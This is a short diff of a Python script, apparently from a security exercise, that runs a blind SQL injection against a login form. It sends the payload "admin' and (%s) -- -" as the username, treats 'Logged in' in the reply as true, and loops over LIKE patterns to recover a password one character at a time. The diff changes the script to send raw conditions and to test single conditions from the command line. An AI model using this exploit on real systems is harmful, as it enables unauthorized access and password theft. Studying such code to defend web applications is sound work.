@@ -9,8 +9,15 @@ TRUE = "Logged in"
 def postURL(url, data):
 	return SESSION.post(format(url), data).text
 
+# def evaluateCondition(cond):
+# 	payload = "admin' and (%s) -- -" % cond  # Does this SQL format look familar?
+# 	response = postURL(BASEURL, {"username" : payload})
+
+# 	#print response
+# 	return TRUE in response
+
 def evaluateCondition(cond):
-	payload = "admin' and (%s) -- -" % cond  # Does this SQL format look familar?
+	payload = cond  # Does this SQL format look familar?
 	response = postURL(BASEURL, {"username" : payload})
 
 	#print response
@@ -33,5 +40,5 @@ def exploitSQL(): # Loops SQL injection 'password LIKE y%' until password is fou
 				passthrough = True
 	return password
 	
-#print evaluateCondition(sys.argv[1])
-print exploitSQL()
+print evaluateCondition(sys.argv[1])
+#print exploitSQL()
